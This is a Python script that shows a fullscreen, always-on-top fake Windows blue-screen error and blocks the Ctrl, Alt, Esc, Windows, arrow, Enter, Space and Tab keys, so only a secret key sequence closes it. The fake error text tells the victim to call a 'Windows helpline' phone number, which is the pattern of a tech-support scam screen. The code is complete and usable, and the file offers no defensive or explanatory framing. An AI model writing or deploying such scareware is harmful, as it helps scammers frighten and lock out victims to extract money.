import tkinter as tk
import keyboard

class Example:
    def __init__(self, master):
        self.master = master
        self.label = tk.Label(master, text="A problem has been detected and Windows has been shut down to prevent damage\n"
                                            "to your computer.\n\n"
                                            "If this is the first time you've seen this stop error screen, "
                                            "restart your computer. If this screen appears again, follow\n"
                                            "these steps:\n\n"
                                            "Check to be sure you have adequate disk space. If a driver is\n"
                                            "identified in the stop message, disable the driver or check\n"
                                            "with the manufacturer for driver updates. Try changing video\n"
                                            "adapters.\n\n"
                                            "Check with your hardware vendor for any BIOS updates. Disable\n"
                                            "BIOS memory options such as caching or shadowing. If you need\n"
                                            "to use Safe Mode to remove or disable components, restart your\n"
                                            "computer, press F8 to select Advanced Startup Options, and then\n"
                                            "select Safe Mode.\n\n"
                                            "For technical support to this problem, call Windows helpline:\n"
                                            "+1(888)424 6542\n\n"
                                            "Technical information:\n"
                                            "STOP: 0x0000001E\n"
                                            "*** STOP: 0x0000001E (0xFFFFFFFFFC0000094, 0xFFFFF800C073D1E, 0xFFFFFFFFFFD)",
                                            bg="dark blue", fg="white", font=("Courier New", 18), justify="left")
        self.label.pack(expand=True, fill=tk.BOTH)
        self.master.bind("<Key>", self.key_pressed)
        self.blink()

        self.key_sequence = []
        self.target_sequence = ['h', 'j', 'k', 'р', 'о', 'л']

    def key_pressed(self, event):
        if event.char in self.target_sequence:
            self.key_sequence.append(event.char)

            if len(self.key_sequence) >= 3 and (self.key_sequence[-3:] == ['h', 'j', 'k'] or self.key_sequence[-3:] == ['р', 'о', 'л']):
                self.master.quit()

            if len(self.key_sequence) > len(self.target_sequence):
                self.key_sequence.pop(0)

        return "break"

    def blink(self):
        current_color = self.label.cget("fg")
        new_color = "gray" if current_color == "white" else "white"
        self.label.config(fg=new_color)
        self.master.after(500, self.blink)

root = tk.Tk()
root.configure(background="dark blue")
root.attributes('-fullscreen', True)
root.wm_attributes("-topmost", 1)

keyboard.block_key('ctrl')
keyboard.block_key('alt')
keyboard.block_key('esc')
keyboard.block_key('win')
keyboard.block_key('up')
keyboard.block_key('down')
keyboard.block_key('left')
keyboard.block_key('right')
keyboard.block_key('enter')
keyboard.block_key('space')
keyboard.block_key('tab')

app = Example(root)
root.mainloop()
